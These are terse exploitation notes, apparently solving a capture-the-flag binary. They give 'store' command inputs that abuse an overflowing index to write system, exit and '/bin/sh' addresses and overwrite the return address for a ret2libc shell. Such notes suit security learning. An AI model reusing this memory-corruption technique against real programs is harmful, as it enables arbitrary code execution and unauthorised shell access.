Input command: store
 Number: 4159090384
 Index: 33632971

(gdb) x/xw 0x804a000
0x804a000 <printf@got.plt>:     0xf7e6aed0

write system at index 0:

Input command: store
 Number: 4159090384
 Index: 1073741824

write exit at index 1:

Input command: store
 Number: 4159040368
 Index: 1

write /bin/sh at index 2:

Input command: store
 Number: 4160264172
 Index: 2

write ret2libc address in eip

Input command: store
 Number: 4294956244
 Index: 1073741938

eip = 1073741938
write storage index 0 = 1073741824
